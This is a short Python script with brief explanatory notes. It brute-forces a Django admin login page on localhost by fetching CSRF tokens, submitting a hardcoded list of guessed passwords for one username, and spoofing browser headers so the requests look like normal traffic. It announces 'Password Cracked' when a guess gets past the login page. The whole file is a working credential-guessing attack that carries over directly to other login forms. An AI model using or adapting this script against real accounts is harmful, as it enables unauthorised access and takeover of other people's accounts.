import requests
from bs4 import BeautifulSoup
import time

url='http://127.0.0.1:8000/'

LOGIN_ROUTE = 'admin/login/?next=/admin/'

HEADERS={  #this is stop automation
    'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0',
    'origin':url, 'referer':url+LOGIN_ROUTE
}

USERNAME='Samir'
Password_List=['Samir','Sam','Sari','samir','Samir@1234','Samir@143','Samir@123','sae','SamirPAs','Samie123','admin','Test','Samir@123']

t1=time.perf_counter()
title=''

for password in Password_List:
    s = requests.session()
    csrf_token = s.get(url).cookies['csrftoken']
    # print(csrf_token)
    print(f'CHECKING FOR {USERNAME} and {password} ...')

    LOGIN_DATA = {
        'username': USERNAME,
        'password': password,
        'csrfmiddlewaretoken':csrf_token,
    }

    login_redirect=s.post(url+LOGIN_ROUTE,headers=HEADERS,data=LOGIN_DATA)

    redirect_url=s.get(url+'admin/').text

    soup=BeautifulSoup(redirect_url,'lxml')
    title=soup.find('head').title.text
    # print(title)

    if str(title) != 'Log in | Django site admin':
        print("    Password Cracked Successfully ..! ",USERNAME," and ",password)
        break

t2=time.perf_counter()
print(f'{t2-t1}s to cracked ..!')


User-Agent is used to the masquerade website that you are sending a request through your browser .
origin is indicate the domain from which request originated.
referer is specifies the URL from which the current request is originated.


